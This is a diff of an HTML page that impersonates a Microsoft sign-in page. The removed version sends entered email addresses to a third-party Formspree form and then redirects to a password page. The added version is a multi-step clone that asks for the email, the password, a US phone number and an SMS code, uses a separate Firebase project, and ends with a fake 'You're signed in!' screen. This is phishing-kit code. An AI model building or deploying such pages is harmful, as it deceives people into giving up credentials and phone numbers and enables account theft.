@@ -2,236 +2,455 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sign in to your account</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Microsoft Sign In</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f3f2f1;
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f2f2f2;
       min-height: 100vh;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 2rem 1rem;
     }
     .card {
       background: #fff;
+      width: 100%;
+      max-width: 440px;
+      min-height: 516px;
       padding: 44px;
-      width: 100%;
-      max-width: 440px;
+      border-radius: 2px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+      display: none;
+      flex-direction: column;
+      animation: fadeIn 0.2s ease;
     }
-    .ms-logo {
-      margin-bottom: 16px;
+    .card.active { display: flex; }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to   { opacity: 1; transform: translateY(0); }
     }
-    .ms-logo svg {
-      width: 108px;
-      height: 24px;
+    .ms-logo { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; }
+    .ms-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 21px; height: 21px; }
+    .ms-grid span { display: block; }
+    .ms-grid span:nth-child(1) { background: #f25022; }
+    .ms-grid span:nth-child(2) { background: #7fba00; }
+    .ms-grid span:nth-child(3) { background: #00a4ef; }
+    .ms-grid span:nth-child(4) { background: #ffb900; }
+    .ms-name { font-size: 17px; color: #1b1b1b; font-weight: 400; }
+    h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 16px; }
+    p.subtitle { font-size: 15px; color: #1b1b1b; line-height: 1.5; margin-bottom: 20px; }
+    .email-chip {
+      display: inline-flex; align-items: center; border: 1px solid #8a8a8a;
+      border-radius: 16px; padding: 4px 12px; font-size: 13px; color: #1b1b1b;
+      margin-bottom: 20px; cursor: pointer; width: fit-content;
     }
-    .card h1 {
-      font-size: 24px;
-      font-weight: 600;
-      color: #1b1b1b;
-      margin-bottom: 8px;
-    }
-    .card p.sub {
-      font-size: 13px;
-      color: #1b1b1b;
-      margin-bottom: 20px;
-    }
-    .card p.sub a {
-      color: #0067b8;
-      text-decoration: none;
-    }
-    .card p.sub a:hover { text-decoration: underline; }
-    .input-wrap { margin-bottom: 8px; }
+    .input-wrap { position: relative; margin-bottom: 4px; }
     .input-wrap input {
-      width: 100%;
-      height: 36px;
-      border: 1px solid #666;
-      padding: 0 8px;
-      font-size: 15px;
-      outline: none;
-      color: #1b1b1b;
-      font-family: inherit;
+      width: 100%; border: none; border-bottom: 1px solid #666;
+      padding: 8px 40px 8px 0; font-size: 15px; color: #1b1b1b;
+      outline: none; background: transparent; font-family: inherit;
     }
-    .input-wrap input:focus {
-      border-color: #0067b8;
-      border-width: 2px;
+    .input-wrap input:focus { border-bottom: 2px solid #0067b8; }
+    .input-wrap input::placeholder { color: transparent; }
+    .input-wrap label {
+      position: absolute; top: 8px; left: 0; font-size: 15px;
+      color: #666; pointer-events: none; transition: 0.15s ease;
     }
-    .hint {
-      font-size: 12px;
-      color: #d83b01;
-      margin-bottom: 12px;
-      min-height: 16px;
+    .input-wrap input:focus ~ label,
+    .input-wrap input:not(:placeholder-shown) ~ label {
+      top: -14px; font-size: 12px; color: #0067b8;
     }
-    .options-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 20px;
+    .toggle-pw {
+      position: absolute; right: 0; top: 8px; background: none;
+      border: none; cursor: pointer; color: #605e5c;
     }
-    .options-row a {
-      font-size: 13px;
-      color: #0067b8;
-      text-decoration: none;
+    .phone-wrap {
+      display: flex; align-items: flex-end;
+      border-bottom: 1px solid #666; margin-top: 4px;
     }
-    .options-row a:hover { text-decoration: underline; }
-    .next-btn {
-      width: 100%;
-      background: #0067b8;
-      color: #fff;
-      border: none;
-      height: 32px;
-      font-size: 15px;
-      font-family: inherit;
-      cursor: pointer;
-      margin-bottom: 16px;
+    .phone-wrap:focus-within { border-bottom: 2px solid #0067b8; }
+    .country-code {
+      display: flex; align-items: center; gap: 5px;
+      padding: 8px 12px 8px 0; cursor: pointer; white-space: nowrap;
+      color: #1b1b1b; font-size: 15px; border-right: 1px solid #ccc;
+      margin-right: 12px; user-select: none;
     }
-    .next-btn:hover { background: #005da6; }
-    .next-btn:active { background: #004e8c; }
-    .signup-row { font-size: 13px; color: #1b1b1b; }
-    .signup-row a { color: #0067b8; text-decoration: none; }
-    .signup-row a:hover { text-decoration: underline; }
-    .divider {
-      border: none;
-      border-top: 1px solid #ccc;
-      margin: 20px 0;
+    .phone-input-wrap { position: relative; flex: 1; }
+    .phone-input-wrap input {
+      width: 100%; border: none; padding: 8px 0; font-size: 15px;
+      color: #1b1b1b; outline: none; background: transparent;
+      font-family: inherit; letter-spacing: 0.5px;
     }
-    .github-btn {
-      width: 100%;
-      height: 32px;
-      border: 1px solid #8a8886;
-      background: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      font-size: 13px;
-      font-family: inherit;
-      color: #1b1b1b;
-      cursor: pointer;
+    .phone-input-wrap input::placeholder { color: transparent; }
+    .phone-input-wrap label {
+      position: absolute; top: 8px; left: 0; font-size: 15px;
+      color: #666; pointer-events: none; transition: 0.15s ease;
     }
-    .github-btn:hover { background: #f3f2f1; }
-    .footer {
-      margin-top: 16px;
-      display: flex;
-      gap: 16px;
-      flex-wrap: wrap;
-      justify-content: flex-start;
-      width: 100%;
-      max-width: 440px;
+    .phone-input-wrap input:focus ~ label,
+    .phone-input-wrap input:not(:placeholder-shown) ~ label {
+      top: -14px; font-size: 12px; color: #0067b8;
     }
-    .footer a {
-      font-size: 11px;
-      color: #616161;
-      text-decoration: none;
+    .links-row { margin-top: 12px; display: flex; flex-direction: column; gap: 8px; }
+    a.ms-link { color: #0067b8; font-size: 14px; text-decoration: none; cursor: pointer; }
+    a.ms-link:hover { text-decoration: underline; }
+    .spacer { flex: 1; }
+    .btn-row { display: flex; align-items: center; justify-content: flex-end; gap: 16px; margin-top: 24px; }
+    .btn-primary {
+      background: #0067b8; color: #fff; border: none; padding: 10px 20px;
+      font-size: 15px; font-family: inherit; cursor: pointer; min-width: 108px; transition: background 0.15s;
     }
-    .footer a:hover { text-decoration: underline; }
+    .btn-primary:hover { background: #005a9e; }
+    .btn-primary:disabled { background: #a0c4e8; cursor: not-allowed; }
+    .btn-primary.full-width { width: 100%; padding: 14px; font-size: 16px; margin-top: 24px; }
+    .signin-options {
+      display: flex; align-items: center; gap: 14px; border: 1px solid #8a8a8a;
+      padding: 14px 16px; cursor: pointer; background: none; width: 100%;
+      font-size: 15px; font-family: inherit; color: #1b1b1b; margin-top: 20px;
+    }
+    .signin-options:hover { background: #f5f5f5; }
+    .footer-links { margin-top: 32px; display: flex; gap: 20px; flex-wrap: wrap; }
+    .footer-links a { font-size: 12px; color: #1b1b1b; text-decoration: none; }
+    .footer-links a:hover { text-decoration: underline; }
+    .private-note { margin-top: 8px; font-size: 12px; color: #605e5c; }
+    .private-note a { color: #0067b8; text-decoration: none; }
+    .back-row { display: flex; align-items: center; margin-bottom: 24px; }
+    .back-btn { background: none; border: none; cursor: pointer; padding: 4px; color: #1b1b1b; display: flex; align-items: center; }
+    .back-btn:hover { color: #0067b8; }
+    .confirm-btn-row { display: flex; justify-content: flex-end; margin-top: 32px; }
+    .msg { font-size: 13px; margin-top: 10px; padding: 8px 12px; display: none; }
+    .msg.error { background: #fde8e8; color: #c0392b; display: block; }
+    .msg.success { background: #e8f5e9; color: #27ae60; display: block; }
+    .code-inputs { display: flex; gap: 10px; margin: 20px 0; }
+    .code-inputs input {
+      width: 48px; height: 54px; text-align: center; font-size: 22px; font-weight: 600;
+      border: 1px solid #8a8a8a; outline: none; color: #1b1b1b; font-family: inherit;
+    }
+    .code-inputs input:focus { border-color: #0067b8; border-width: 2px; }
+    .resend-row { margin-top: 12px; font-size: 14px; color: #605e5c; }
+    .resend-row span { color: #0067b8; cursor: pointer; }
+    .resend-row span:hover { text-decoration: underline; }
+    .spinner {
+      display: inline-block; width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff;
+      border-radius: 50%; animation: spin 0.7s linear infinite;
+      margin-left: 8px; vertical-align: middle;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    /* reCAPTCHA badge hidden but required */
+    #recaptcha-container { margin-top: 16px; }
   </style>
 </head>
 <body>
 
-  <div class="card">
-    <div class="ms-logo">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24">
-        <rect x="0"  y="0"  width="11" height="11" fill="#f25022"/>
-        <rect x="12" y="0"  width="11" height="11" fill="#7fba00"/>
-        <rect x="0"  y="12" width="11" height="11" fill="#00a4ef"/>
-        <rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
-        <text x="28" y="17" font-family="'Segoe UI',sans-serif" font-size="20" font-weight="600" fill="#1b1b1b">Microsoft</text>
-      </svg>
-    </div>
-
-    <h1>Sign in</h1>
-    <p class="sub">to continue to <a href="#">Microsoft Office</a></p>
-    
-    <form action="https://formspree.io/f/xpwlqqbb" method="POST" id="myForm">
-  
+<!-- Screen 1: Sign In -->
+<div class="card active" id="screen1">
+  <div class="ms-logo">
+    <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+    <span class="ms-name">Microsoft</span>
+  </div>
+  <h1>Sign in</h1>
   <div class="input-wrap">
-    <input type="email" id="email-input" name="email" placeholder="Enter your email" required />
-    <div id="hint-text" class="hint"></div>
-
+    <input type="text" id="emailInput" placeholder=" " />
+    <label>Email, phone, or Skype</label>
   </div>
-
-  <button type="submit" class="next-btn">Next</button>
-
-</form>
-
-<div class="options-row">
-      <a href="#">No account? Create one!</a>
-      <a href="#">Sign-in options</a>
-    </div>
-    
-    <div class="signup-row">
-      <a href="#">Can't access your account?</a>
-    </div>
-
-    <hr class="divider" />
-
-    <button class="github-btn">
-      <svg width="16" height="16" viewBox="0 0 16 16" fill="#1b1b1b">
-        <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38
-          0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13
-          -.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66
-          .07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15
-          -.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27
-          .68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12
-          .51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48
-          0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
-      </svg>
-      GitHub
-    </button>
+  <div class="links-row">
+    <a class="ms-link" href="#">No account? <strong>Create one!</strong></a>
+    <a class="ms-link" href="#">Can't access your account?</a>
   </div>
-
-  <div class="footer">
+  <div class="spacer"></div>
+  <div class="btn-row">
+    <button class="btn-primary" onclick="handleEmail()">Next</button>
+  </div>
+  <button class="signin-options">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+      <circle cx="8" cy="8" r="3"/>
+      <path d="M16 18v-1a5 5 0 0 0-5-5H5a5 5 0 0 0-5 5v1"/>
+      <path d="M22 18v-1a4 4 0 0 0-3-3.87"/>
+      <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+    </svg>
+    Sign-in options
+  </button>
+  <div class="footer-links">
     <a href="#">Terms of use</a>
     <a href="#">Privacy &amp; cookies</a>
-    <a href="#">...</a>
   </div>
+</div>
 
- <script>
-  const form = document.getElementById("myForm");
-  const input = document.getElementById("email-input");
-  const hint = document.getElementById("hint-text");
+<!-- Screen 2: Password -->
+<div class="card" id="screen2">
+  <div class="back-row">
+    <button class="back-btn" onclick="goTo('screen1')">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M19 12H5M12 5l-7 7 7 7"/>
+      </svg>
+    </button>
+    <div class="ms-logo" style="margin-bottom:0; margin-left:auto;">
+      <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+      <span class="ms-name">Microsoft</span>
+    </div>
+  </div>
+  <div class="email-chip" id="emailChip" onclick="goTo('screen1')">user@example.com</div>
+  <h1>Enter your password</h1>
+  <div class="input-wrap">
+    <input type="password" id="pwInput" placeholder=" " />
+    <label>Password</label>
+    <button class="toggle-pw" onclick="togglePw()" type="button">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+        <circle cx="12" cy="12" r="3"/>
+      </svg>
+    </button>
+  </div>
+  <div class="links-row">
+    <a class="ms-link" href="#">Forgot your password?</a>
+  </div>
+  <button class="btn-primary full-width" onclick="handlePassword()">Next</button>
+  <div style="text-align:center; margin-top:20px;">
+    <a class="ms-link" href="#">Other ways to sign in</a>
+  </div>
+  <div class="spacer"></div>
+  <div class="footer-links">
+    <a href="#">Help and feedback</a>
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy and cookies</a>
+  </div>
+  <div class="private-note">
+    Use private browsing if this is not your device. <a href="#">Learn more</a>
+  </div>
+</div>
 
-  form.addEventListener("submit", async function (e) {
-    e.preventDefault(); // stop default redirect
+<!-- Screen 3: Phone Number -->
+<div class="card" id="screen3">
+  <div class="ms-logo">
+    <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+    <span class="ms-name">Microsoft</span>
+  </div>
+  <h1>Confirm sign in?</h1>
+  <p class="subtitle">Confirm this sign-in using your personal Microsoft account.</p>
+  <div class="phone-wrap">
+    <div class="country-code">
+      <span>&#127482;&#127480;</span>
+      <span>+1</span>
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#605e5c" stroke-width="2.5">
+        <path d="M6 9l6 6 6-6"/>
+      </svg>
+    </div>
+    <div class="phone-input-wrap">
+      <input type="tel" id="phoneInput" placeholder=" " maxlength="14" oninput="formatPhone(this)" />
+      <label>Mobile number</label>
+    </div>
+  </div>
+  <!-- Firebase invisible reCAPTCHA mounts here -->
+  <div id="recaptcha-container"></div>
+  <div id="phoneMsg" class="msg"></div>
+  <div class="spacer"></div>
+  <div class="confirm-btn-row">
+    <button class="btn-primary" id="sendCodeBtn" onclick="handleSendCode()">Confirm</button>
+  </div>
+</div>
 
-    const val = input.value.trim();
+<!-- Screen 4: Enter SMS Code -->
+<div class="card" id="screen4">
+  <div class="ms-logo">
+    <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+    <span class="ms-name">Microsoft</span>
+  </div>
+  <h1>Enter code</h1>
+  <p class="subtitle">We sent a 6-digit code to <strong id="phoneMask"></strong>. Enter it below.</p>
+  <div class="code-inputs">
+    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,0)" onkeydown="movePrev(event,0)" />
+    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,1)" onkeydown="movePrev(event,1)" />
+    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,2)" onkeydown="movePrev(event,2)" />
+    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,3)" onkeydown="movePrev(event,3)" />
+    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,4)" onkeydown="movePrev(event,4)" />
+    <input type="tel" maxlength="1" class="code-digit" oninput="moveNext(this,5)" onkeydown="movePrev(event,5)" />
+  </div>
+  <div id="codeMsg" class="msg"></div>
+  <div class="resend-row">Didn't get it? <span onclick="handleSendCode(true)">Resend code</span></div>
+  <div class="spacer"></div>
+  <div class="confirm-btn-row">
+    <button class="btn-primary" id="verifyBtn" onclick="handleVerifyCode()">Verify</button>
+  </div>
+</div>
 
-    // ✅ your original validation
-    if (!val) {
-      hint.textContent = "Enter a valid email address, phone number, or Skype name.";
+<!-- Screen 5: Success -->
+<div class="card" id="screen5">
+  <div class="ms-logo">
+    <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+    <span class="ms-name">Microsoft</span>
+  </div>
+  <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:16px;">
+    <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#27ae60" stroke-width="1.8">
+      <circle cx="12" cy="12" r="10"/>
+      <path d="M9 12l2 2 4-4"/>
+    </svg>
+    <h1 style="font-size:22px;">You're signed in!</h1>
+    <p style="color:#605e5c;font-size:15px;">Your identity has been verified successfully.</p>
+  </div>
+</div>
+
+<!-- Firebase SDKs -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
+  import { getAuth, RecaptchaVerifier, signInWithPhoneNumber }
+    from "https://www.gstatic.com/firebasejs/12.12.0/firebase-auth.js";
+
+  // Firebase config
+  const firebaseConfig = {
+    apiKey: "AIzaSyBqgiY5uKZR5xj8jx_sR2dsvktX_n9_Br8",
+    authDomain: "fir-d5c10.firebaseapp.com",
+    projectId: "fir-d5c10",
+    storageBucket: "fir-d5c10.firebasestorage.app",
+    messagingSenderId: "1014125943549",
+    appId: "1:1014125943549:web:1a63e674df039d45907c94"
+  };
+
+  // Initialize Firebase and the SDKs used in this app.
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+  auth.useDeviceLanguage();
+
+  let confirmationResult = null;
+
+  // Setup invisible reCAPTCHA
+  function setupRecaptcha() {
+    if (!window.recaptchaVerifier) {
+      window.recaptchaVerifier = new RecaptchaVerifier(auth, 'recaptcha-container', {
+        size: 'invisible',
+        callback: () => {}
+      });
+    }
+  }
+
+  // Expose functions to global scope for onclick handlers
+  window.handleSendCode = async function(isResend) {
+    var raw = document.getElementById('phoneInput').value.replace(/\D/g, '');
+    if (raw.length < 10) {
+      showMsg('phoneMsg', 'Please enter a valid 10-digit US number.', 'error');
       return;
     }
 
-    hint.textContent = "";
+    var phoneNumber = '+1' + raw;
+    var btn = document.getElementById('sendCodeBtn');
+    btn.disabled = true;
+    btn.innerHTML = 'Sending<span class="spinner"></span>';
+    hideMsg('phoneMsg');
 
     try {
-      // ✅ send to Formspree
-      await fetch(form.action, {
-        method: "POST",
-        body: new FormData(form),
-        headers: { "Accept": "application/json" }
-      });
-
-      // ✅ then redirect
-      window.location.href = "password.html";
-
-    } catch (error) {
-      hint.textContent = "Something went wrong. Try again.";
+      setupRecaptcha();
+      confirmationResult = await signInWithPhoneNumber(auth, phoneNumber, window.recaptchaVerifier);
+      document.getElementById('phoneMask').textContent =
+        phoneNumber.replace(/(\+1)(\d{3})(\d{3})(\d{4})/, '+1 ($2) $3-$4');
+      clearCodeInputs();
+      goTo('screen4');
+    } catch (err) {
+      console.error('Firebase error:', err);
+      // Reset reCAPTCHA on error so it can be retried
+      if (window.recaptchaVerifier) {
+        window.recaptchaVerifier.clear();
+        window.recaptchaVerifier = null;
+      }
+      showMsg('phoneMsg', err.message || 'Failed to send code. Try again.', 'error');
     }
-  });
 
-  // ✅ keep Enter key behavior
-  input.addEventListener("keydown", function (e) {
-    if (e.key === "Enter") {
-      form.dispatchEvent(new Event("submit", { cancelable: true }));
+    btn.disabled = false;
+    btn.innerHTML = 'Confirm';
+  };
+
+  window.handleVerifyCode = async function() {
+    var digits = document.querySelectorAll('.code-digit');
+    var code = Array.from(digits).map(function(i) { return i.value; }).join('');
+    if (code.length < 6) {
+      showMsg('codeMsg', 'Please enter all 6 digits.', 'error');
+      return;
     }
-  });
+    if (!confirmationResult) {
+      showMsg('codeMsg', 'Session expired. Please go back and resend the code.', 'error');
+      return;
+    }
+
+    var btn = document.getElementById('verifyBtn');
+    btn.disabled = true;
+    btn.innerHTML = 'Verifying<span class="spinner"></span>';
+    hideMsg('codeMsg');
+
+    try {
+      await confirmationResult.confirm(code);
+      goTo('screen5');
+    } catch (err) {
+      console.error('Verify error:', err);
+      showMsg('codeMsg', 'Invalid code. Please try again.', 'error');
+    }
+
+    btn.disabled = false;
+    btn.innerHTML = 'Verify';
+  };
 </script>
 
+<script>
+  // Non-module global functions
+  function goTo(id) {
+    document.querySelectorAll('.card').forEach(function(c) { c.classList.remove('active'); });
+    document.getElementById(id).classList.add('active');
+  }
+  function handleEmail() {
+    var email = document.getElementById('emailInput').value.trim();
+    if (!email) return;
+    document.getElementById('emailChip').textContent = email;
+    goTo('screen2');
+  }
+  function handlePassword() {
+    var pw = document.getElementById('pwInput').value;
+    if (!pw) return;
+    goTo('screen3');
+  }
+  function togglePw() {
+    var i = document.getElementById('pwInput');
+    i.type = i.type === 'password' ? 'text' : 'password';
+  }
+  function formatPhone(input) {
+    var v = input.value.replace(/\D/g,'').substring(0,10);
+    var out = '';
+    if (v.length > 6)      out = '('+v.substring(0,3)+') '+v.substring(3,6)+'-'+v.substring(6);
+    else if (v.length > 3) out = '('+v.substring(0,3)+') '+v.substring(3);
+    else if (v.length > 0) out = '('+v;
+    input.value = out;
+  }
+  function moveNext(input, index) {
+    input.value = input.value.replace(/\D/g,'');
+    var digits = document.querySelectorAll('.code-digit');
+    if (input.value && index < 5) digits[index+1].focus();
+  }
+  function movePrev(e, index) {
+    if (e.key === 'Backspace') {
+      var digits = document.querySelectorAll('.code-digit');
+      if (!digits[index].value && index > 0) digits[index-1].focus();
+    }
+  }
+  function clearCodeInputs() {
+    document.querySelectorAll('.code-digit').forEach(function(i){ i.value=''; });
+  }
+  function showMsg(id, text, type) {
+    var el = document.getElementById(id);
+    el.textContent = text;
+    el.className = 'msg ' + type;
+  }
+  function hideMsg(id) {
+    var el = document.getElementById(id);
+    el.className = 'msg';
+    el.textContent = '';
+  }
+  document.addEventListener('keydown', function(e) {
+    if (e.key !== 'Enter') return;
+    var active = document.querySelector('.card.active');
+    if (!active) return;
+    if (active.id === 'screen1') handleEmail();
+    else if (active.id === 'screen2') handlePassword();
+    else if (active.id === 'screen3' && window.handleSendCode) window.handleSendCode();
+    else if (active.id === 'screen4' && window.handleVerifyCode) window.handleVerifyCode();
+  });
+</script>
 </body>
 </html>
